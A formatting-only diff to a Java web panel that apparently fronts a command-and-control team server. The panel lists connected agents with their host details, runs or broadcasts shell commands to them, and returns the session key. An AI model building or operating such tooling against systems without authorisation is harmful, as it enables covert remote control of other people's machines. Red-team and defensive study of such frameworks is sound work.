@@ -32,19 +32,20 @@ public class WebApp {
     private final Path BaseDir;
 
     public WebApp(ServerConfig Config, ListenerMode Mode) {
-        this.Config     = Config;
+        this.Config = Config;
         this.ActiveMode = Mode;
-        this.MaxLogs    = Config.GetMaxLogEntries();
-        this.BaseDir    = ResolveBaseDir();
-        this.Db         = TeamDatabase.Connect(Config);
+        this.MaxLogs = Config.GetMaxLogEntries();
+        this.BaseDir = ResolveBaseDir();
+        this.Db = TeamDatabase.Connect(Config);
     }
 
     private Path ResolveBaseDir() {
         try {
-            Path JarPath = Paths.get(WebApp.class.getProtectionDomain()
-                .getCodeSource().getLocation().toURI());
-            for (Path P : new Path[]{ JarPath.getParent(),
-                    JarPath.getParent() != null ? JarPath.getParent().getParent() : null }) {
+            Path JarPath = Paths.get(WebApp.class.getProtectionDomain().getCodeSource().getLocation().toURI());
+            for (Path P : new Path[] {
+                JarPath.getParent(),
+                JarPath.getParent() != null ? JarPath.getParent().getParent() : null,
+            }) {
                 if (P != null && Files.exists(P.resolve("config"))) return P.toAbsolutePath();
             }
         } catch (Exception Ignored) {}
@@ -78,24 +79,26 @@ public class WebApp {
     }
 
     private void SetupRoutes() {
-        HttpSrv.createContext("/",                        new StaticHandler());
-        HttpSrv.createContext("/api/server/status",       Ex -> Handle(Ex, this::ApiServerStatus));
-        HttpSrv.createContext("/api/server/start",        Ex -> Handle(Ex, this::ApiServerStart));
-        HttpSrv.createContext("/api/server/stop",         Ex -> Handle(Ex, this::ApiServerStop));
-        HttpSrv.createContext("/api/agents",              Ex -> Handle(Ex, this::ApiGetAgents));
-        HttpSrv.createContext("/api/logs",                Ex -> Handle(Ex, this::ApiGetLogs));
-        HttpSrv.createContext("/api/logs/clear",          Ex -> Handle(Ex, this::ApiClearLogs));
-        HttpSrv.createContext("/api/command/execute",     Ex -> Handle(Ex, this::ApiExecuteCommand));
-        HttpSrv.createContext("/api/command/history",     Ex -> Handle(Ex, this::ApiCommandHistory));
-        HttpSrv.createContext("/api/sessions/history",    Ex -> Handle(Ex, this::ApiSessionHistory));
-        HttpSrv.createContext("/api/team/operators",      Ex -> Handle(Ex, this::ApiGetOperators));
-        HttpSrv.createContext("/api/team/note",           Ex -> Handle(Ex, this::ApiSetNote));
-        HttpSrv.createContext("/api/command/broadcast",    Ex -> Handle(Ex, this::ApiBroadcast));
+        HttpSrv.createContext("/", new StaticHandler());
+        HttpSrv.createContext("/api/server/status", Ex -> Handle(Ex, this::ApiServerStatus));
+        HttpSrv.createContext("/api/server/start", Ex -> Handle(Ex, this::ApiServerStart));
+        HttpSrv.createContext("/api/server/stop", Ex -> Handle(Ex, this::ApiServerStop));
+        HttpSrv.createContext("/api/agents", Ex -> Handle(Ex, this::ApiGetAgents));
+        HttpSrv.createContext("/api/logs", Ex -> Handle(Ex, this::ApiGetLogs));
+        HttpSrv.createContext("/api/logs/clear", Ex -> Handle(Ex, this::ApiClearLogs));
+        HttpSrv.createContext("/api/command/execute", Ex -> Handle(Ex, this::ApiExecuteCommand));
+        HttpSrv.createContext("/api/command/history", Ex -> Handle(Ex, this::ApiCommandHistory));
+        HttpSrv.createContext("/api/sessions/history", Ex -> Handle(Ex, this::ApiSessionHistory));
+        HttpSrv.createContext("/api/team/operators", Ex -> Handle(Ex, this::ApiGetOperators));
+        HttpSrv.createContext("/api/team/note", Ex -> Handle(Ex, this::ApiSetNote));
+        HttpSrv.createContext("/api/command/broadcast", Ex -> Handle(Ex, this::ApiBroadcast));
         HttpSrv.createContext("/api/command/broadcastall", Ex -> Handle(Ex, this::ApiBroadcastAll));
     }
 
     @FunctionalInterface
-    interface RequestHandler { String Handle(HttpExchange E) throws Exception; }
+    interface RequestHandler {
+        String Handle(HttpExchange E) throws Exception;
+    }
 
     private void Handle(HttpExchange E, RequestHandler H) {
         try {
@@ -104,16 +107,21 @@ public class WebApp {
             E.getResponseHeaders().add("Access-Control-Allow-Methods", "GET,POST,OPTIONS");
             E.getResponseHeaders().add("Access-Control-Allow-Headers", "Content-Type,Authorization");
             if (E.getRequestMethod().equalsIgnoreCase("OPTIONS")) {
-                E.sendResponseHeaders(200, -1); return;
+                E.sendResponseHeaders(200, -1);
+                return;
             }
             byte[] Bytes = H.Handle(E).getBytes("UTF-8");
             E.sendResponseHeaders(200, Bytes.length);
-            try (OutputStream Os = E.getResponseBody()) { Os.write(Bytes); }
+            try (OutputStream Os = E.getResponseBody()) {
+                Os.write(Bytes);
+            }
         } catch (Exception Ex) {
             try {
                 byte[] Bytes = GsonInst.toJson(Map.of("Error", Ex.getMessage())).getBytes("UTF-8");
                 E.sendResponseHeaders(500, Bytes.length);
-                try (OutputStream Os = E.getResponseBody()) { Os.write(Bytes); }
+                try (OutputStream Os = E.getResponseBody()) {
+                    Os.write(Bytes);
+                }
             } catch (IOException Ignored) {}
         }
     }
@@ -121,25 +129,26 @@ public class WebApp {
     private String ApiServerStatus(HttpExchange E) {
         Map<String, Object> R = new LinkedHashMap<>();
         boolean Running = Server != null && Server.IsRunning();
-        R.put("Status",      Running ? "Online" : "Offline");
-        R.put("Mode",        ActiveMode.name());
-        R.put("Host",        Running ? Server.GetHost() : Config.GetServerHost());
-        R.put("Port",        Running ? Server.GetPort() : Config.GetServerPort());
-        R.put("StartedAt",   ServerStartTime != null ? ServerStartTime.getEpochSecond() : 0);
-        R.put("Uptime",      GetUptime());
-        R.put("Agents",      Running ? Server.GetSessions().Count() : 0);
+        R.put("Status", Running ? "Online" : "Offline");
+        R.put("Mode", ActiveMode.name());
+        R.put("Host", Running ? Server.GetHost() : Config.GetServerHost());
+        R.put("Port", Running ? Server.GetPort() : Config.GetServerPort());
+        R.put("StartedAt", ServerStartTime != null ? ServerStartTime.getEpochSecond() : 0);
+        R.put("Uptime", GetUptime());
+        R.put("Agents", Running ? Server.GetSessions().Count() : 0);
         R.put("DbConnected", Db.IsConnected());
-        R.put("DbType",      Config.GetDbType());
+        R.put("DbType", Config.GetDbType());
         if (Running) R.put("Key", Server.GetCrypto().GetKeyAsBase64Url());
         return GsonInst.toJson(R);
     }
 
     private String ApiServerStart(HttpExchange E) throws Exception {
-        if (Server != null && Server.IsRunning())
-            return GsonInst.toJson(Map.of("Success", false, "Message", "Already running"));
+        if (Server != null && Server.IsRunning()) return GsonInst.toJson(
+            Map.of("Success", false, "Message", "Already running")
+        );
         Map<String, Object> Body = ParseBody(E);
         String Host = str(Body, "Host", Config.GetServerHost());
-        int    Port = intVal(Body, "Port", Config.GetServerPort());
+        int Port = intVal(Body, "Port", Config.GetServerPort());
         Server = new TomcatServer(Host, Port, ActiveMode, Config);
         Server.AddEventListener(this::OnEvent);
         boolean[] Result = Server.StartServer();
@@ -151,13 +160,26 @@ public class WebApp {
         AddLog("[+] Server started on " + Host + ":" + Port + " [" + ActiveMode.name() + "]");
         AddLog("[+] Session key: " + Server.GetCrypto().GetKeyAsBase64Url());
         new Thread(Server::AcceptConnections, "AcceptConnections").start();
-        return GsonInst.toJson(Map.of("Success", true, "Host", Host, "Port", Port,
-            "Mode", ActiveMode.name(), "StartedAt", ServerStartTime.getEpochSecond()));
+        return GsonInst.toJson(
+            Map.of(
+                "Success",
+                true,
+                "Host",
+                Host,
+                "Port",
+                Port,
+                "Mode",
+                ActiveMode.name(),
+                "StartedAt",
+                ServerStartTime.getEpochSecond()
+            )
+        );
     }
 
     private String ApiServerStop(HttpExchange E) {
-        if (Server == null || !Server.IsRunning())
-            return GsonInst.toJson(Map.of("Success", false, "Message", "Not running"));
+        if (Server == null || !Server.IsRunning()) return GsonInst.toJson(
+            Map.of("Success", false, "Message", "Not running")
+        );
         Server.StopServer();
         Server = null;
         ServerStartTime = null;
@@ -166,25 +188,24 @@ public class WebApp {
     }
 
     private String ApiGetAgents(HttpExchange E) {
-        if (Server == null || !Server.IsRunning())
-            return GsonInst.toJson(Map.of("Agents", Collections.emptyList()));
+        if (Server == null || !Server.IsRunning()) return GsonInst.toJson(Map.of("Agents", Collections.emptyList()));
         List<Map<String, Object>> Agents = new ArrayList<>();
         for (Session S : Server.GetSessions().GetAll()) {
             Map<String, Object> A = new LinkedHashMap<>();
-            A.put("ID",         S.GetId());
-            A.put("Address",    S.GetRemoteAddress());
-            A.put("OS",         S.GetOs());
-            A.put("Hostname",   S.GetHostname());
-            A.put("User",       S.GetUser());
-            A.put("Arch",       S.GetArch());
-            A.put("AgentIP",    S.GetAgentIp());
-            A.put("AgentName",  S.GetAgentName());
-            A.put("JoinedAt",   S.GetJoinedAt());
-            A.put("Type",       S.GetSessionType().name());
-            A.put("ShellMode",  S.GetShellMode());
-            A.put("Encrypted",  S.IsEncrypted());
-            A.put("MtlsEnabled",S.IsMtlsEnabled());
-            A.put("Note",       Db.GetAgentNote(S.GetId()));
+            A.put("ID", S.GetId());
+            A.put("Address", S.GetRemoteAddress());
+            A.put("OS", S.GetOs());
+            A.put("Hostname", S.GetHostname());
+            A.put("User", S.GetUser());
+            A.put("Arch", S.GetArch());
+            A.put("AgentIP", S.GetAgentIp());
+            A.put("AgentName", S.GetAgentName());
+            A.put("JoinedAt", S.GetJoinedAt());
+            A.put("Type", S.GetSessionType().name());
+            A.put("ShellMode", S.GetShellMode());
+            A.put("Encrypted", S.IsEncrypted());
+            A.put("MtlsEnabled", S.IsMtlsEnabled());
+            A.put("Note", Db.GetAgentNote(S.GetId()));
             Agents.add(A);
         }
         return GsonInst.toJson(Map.of("Agents", Agents));
@@ -200,18 +221,20 @@ public class WebApp {
     }
 
     private String ApiExecuteCommand(HttpExchange E) throws Exception {
-        if (Server == null || !Server.IsRunning())
-            return GsonInst.toJson(Map.of("Success", false, "Output", "Server not running"));
+        if (Server == null || !Server.IsRunning()) return GsonInst.toJson(
+            Map.of("Success", false, "Output", "Server not running")
+        );
         Map<String, Object> Body = ParseBody(E);
-        int    AgentId  = intVal(Body, "AgentId", 0);
-        String Command  = str(Body, "Command", "");
+        int AgentId = intVal(Body, "AgentId", 0);
+        String Command = str(Body, "Command", "");
         String Operator = str(Body, "Operator", "system");
-        if (AgentId == 0 || Command.isEmpty())
-            return GsonInst.toJson(Map.of("Success", false, "Output", "Missing AgentId or Command"));
+        if (AgentId == 0 || Command.isEmpty()) return GsonInst.toJson(
+            Map.of("Success", false, "Output", "Missing AgentId or Command")
+        );
         AddLog("[>] [" + Operator + "] Agent-" + AgentId + " » " + Command);
         String[] Result = Server.ExecuteCommand(AgentId, Command);
-        boolean  Ok     = Boolean.parseBoolean(Result[0]);
-        String   Output = Result[1];
+        boolean Ok = Boolean.parseBoolean(Result[0]);
+        String Output = Result[1];
         Db.SaveCommandLog(AgentId, Operator, Command, Output, Ok);
         AddLog(Ok ? "[+] " + Output : "[!] " + Output);
         return GsonInst.toJson(Map.of("Success", Ok, "Output", Output, "Command", Command));
@@ -220,7 +243,7 @@ public class WebApp {
     private String ApiCommandHistory(HttpExchange E) throws Exception {
         Map<String, Object> Body = ParseBody(E);
         int AgentId = intVal(Body, "AgentId", 0);
-        int Limit   = intVal(Body, "Limit", 100);
+        int Limit = intVal(Body, "Limit", 100);
         return GsonInst.toJson(Map.of("History", Db.GetCommandHistory(AgentId, Limit)));
     }
 
@@ -236,8 +259,8 @@ public class WebApp {
 
     private String ApiSetNote(HttpExchange E) throws Exception {
         Map<String, Object> Body = ParseBody(E);
-        int    AgentId = intVal(Body, "AgentId", 0);
-        String Note    = str(Body, "Note", "");
+        int AgentId = intVal(Body, "AgentId", 0);
+        String Note = str(Body, "Note", "");
         Db.SetAgentNote(AgentId, Note);
         return GsonInst.toJson(Map.of("Success", true));
     }
@@ -245,9 +268,14 @@ public class WebApp {
     private void OnEvent(EventType Type, Map<String, Object> Data) {
         switch (Type) {
             case AgentConnected -> {
-                String Msg = String.format("[+] Session-%s [%s] %s@%s %s",
-                    Data.get("ID"), Data.get("Type"), Data.get("User"),
-                    Data.get("Hostname"), Data.get("OS"));
+                String Msg = String.format(
+                    "[+] Session-%s [%s] %s@%s %s",
+                    Data.get("ID"),
+                    Data.get("Type"),
+                    Data.get("User"),
+                    Data.get("Hostname"),
+                    Data.get("OS")
+                );
                 AddLog(Msg);
                 Db.SaveSessionEvent(Data, "connected");
             }
@@ -268,8 +296,7 @@ public class WebApp {
     }
 
     private void AddLog(String Msg) {
-        String Entry = "[" + LocalDateTime.now().format(
-            DateTimeFormatter.ofPattern("HH:mm:ss")) + "] " + Msg;
+        String Entry = "[" + LocalDateTime.now().format(DateTimeFormatter.ofPattern("HH:mm:ss")) + "] " + Msg;
         Logs.add(Entry);
         if (Logs.size() > MaxLogs) Logs.remove(0);
         Db.SaveLog(Entry);
@@ -282,14 +309,20 @@ public class WebApp {
     }
 
     private static String str(Map<String, Object> M, String K, String Def) {
-        Object V = M.get(K); return V != null ? V.toString() : Def;
+        Object V = M.get(K);
+        return V != null ? V.toString() : Def;
     }
+
     private static int intVal(Map<String, Object> M, String K, int Def) {
-        try { return (int) Double.parseDouble(M.getOrDefault(K, Def).toString()); }
-        catch (Exception E) { return Def; }
+        try {
+            return (int) Double.parseDouble(M.getOrDefault(K, Def).toString());
+        } catch (Exception E) {
+            return Def;
+        }
     }
 
     class StaticHandler implements HttpHandler {
+
         @Override
         public void handle(HttpExchange E) throws IOException {
             String ReqPath = E.getRequestURI().getPath();
@@ -305,38 +338,46 @@ public class WebApp {
             if (Target == null) {
                 byte[] R = ("404 Not Found: " + ReqPath).getBytes();
                 E.sendResponseHeaders(404, R.length);
-                try (OutputStream O = E.getResponseBody()) { O.write(R); }
+                try (OutputStream O = E.getResponseBody()) {
+                    O.write(R);
+                }
                 return;
             }
             E.getResponseHeaders().add("Content-Type", ContentType(Target.toString()));
             byte[] Data = Files.readAllBytes(Target);
             E.sendResponseHeaders(200, Data.length);
-            try (OutputStream O = E.getResponseBody()) { O.write(Data); }
+            try (OutputStream O = E.getResponseBody()) {
+                O.write(Data);
+            }
         }
+
         private String ContentType(String P) {
             if (P.endsWith(".html")) return "text/html; charset=UTF-8";
-            if (P.endsWith(".css"))  return "text/css";
-            if (P.endsWith(".js"))   return "application/javascript";
+            if (P.endsWith(".css")) return "text/css";
+            if (P.endsWith(".js")) return "application/javascript";
             if (P.endsWith(".json")) return "application/json";
-            if (P.endsWith(".png"))  return "image/png";
-            if (P.endsWith(".svg"))  return "image/svg+xml";
-            if (P.endsWith(".ico"))  return "image/x-icon";
+            if (P.endsWith(".png")) return "image/png";
+            if (P.endsWith(".svg")) return "image/svg+xml";
+            if (P.endsWith(".ico")) return "image/x-icon";
             return "application/octet-stream";
         }
     }
 
     private String ApiBroadcast(HttpExchange E) throws Exception {
-        if (Server == null || !Server.IsRunning())
-            return GsonInst.toJson(Map.of("Success", false, "Output", "Server not running"));
-        Map<String, Object> Body     = ParseBody(E);
-        String              Command  = str(Body, "Command", "");
-        String              Operator = str(Body, "Operator", "system");
+        if (Server == null || !Server.IsRunning()) return GsonInst.toJson(
+            Map.of("Success", false, "Output", "Server not running")
+        );
+        Map<String, Object> Body = ParseBody(E);
+        String Command = str(Body, "Command", "");
+        String Operator = str(Body, "Operator", "system");
         @SuppressWarnings("unchecked")
         List<Object> RawIds = (List<Object>) Body.getOrDefault("AgentIds", new ArrayList<>());
         if (Command.isEmpty()) return GsonInst.toJson(Map.of("Success", false, "Message", "Missing Command"));
         List<Integer> Ids = new ArrayList<>();
         for (Object O : RawIds) {
-            try { Ids.add((int) Double.parseDouble(O.toString())); } catch (Exception Ignored) {}
+            try {
+                Ids.add((int) Double.parseDouble(O.toString()));
+            } catch (Exception Ignored) {}
         }
         if (Ids.isEmpty()) return GsonInst.toJson(Map.of("Success", false, "Message", "No AgentIds"));
         AddLog("[BROADCAST] [" + Operator + "] → " + Ids.size() + " agents » " + Command);
@@ -345,20 +386,20 @@ public class WebApp {
         for (Map.Entry<Integer, String[]> En : Results.entrySet()) {
             Map<String, Object> R = new LinkedHashMap<>();
             R.put("Success", Boolean.parseBoolean(En.getValue()[0]));
-            R.put("Output",  En.getValue()[1]);
+            R.put("Output", En.getValue()[1]);
             ResultMap.put(String.valueOf(En.getKey()), R);
-            Db.SaveCommandLog(En.getKey(), Operator, Command, En.getValue()[1],
-                Boolean.parseBoolean(En.getValue()[0]));
+            Db.SaveCommandLog(En.getKey(), Operator, Command, En.getValue()[1], Boolean.parseBoolean(En.getValue()[0]));
         }
         return GsonInst.toJson(Map.of("Success", true, "Results", ResultMap, "Count", Results.size()));
     }
 
     private String ApiBroadcastAll(HttpExchange E) throws Exception {
-        if (Server == null || !Server.IsRunning())
-            return GsonInst.toJson(Map.of("Success", false, "Output", "Server not running"));
-        Map<String, Object> Body     = ParseBody(E);
-        String              Command  = str(Body, "Command", "");
-        String              Operator = str(Body, "Operator", "system");
+        if (Server == null || !Server.IsRunning()) return GsonInst.toJson(
+            Map.of("Success", false, "Output", "Server not running")
+        );
+        Map<String, Object> Body = ParseBody(E);
+        String Command = str(Body, "Command", "");
+        String Operator = str(Body, "Operator", "system");
         if (Command.isEmpty()) return GsonInst.toJson(Map.of("Success", false, "Message", "Missing Command"));
         int Total = Server.GetSessions().Count();
         AddLog("[BROADCAST-ALL] [" + Operator + "] → " + Total + " agents » " + Command);
@@ -367,12 +408,10 @@ public class WebApp {
         for (Map.Entry<Integer, String[]> En : Results.entrySet()) {
             Map<String, Object> R = new LinkedHashMap<>();
             R.put("Success", Boolean.parseBoolean(En.getValue()[0]));
-            R.put("Output",  En.getValue()[1]);
+            R.put("Output", En.getValue()[1]);
             ResultMap.put(String.valueOf(En.getKey()), R);
-            Db.SaveCommandLog(En.getKey(), Operator, Command, En.getValue()[1],
-                Boolean.parseBoolean(En.getValue()[0]));
+            Db.SaveCommandLog(En.getKey(), Operator, Command, En.getValue()[1], Boolean.parseBoolean(En.getValue()[0]));
         }
         return GsonInst.toJson(Map.of("Success", true, "Results", ResultMap, "Count", Results.size()));
     }
-
 }
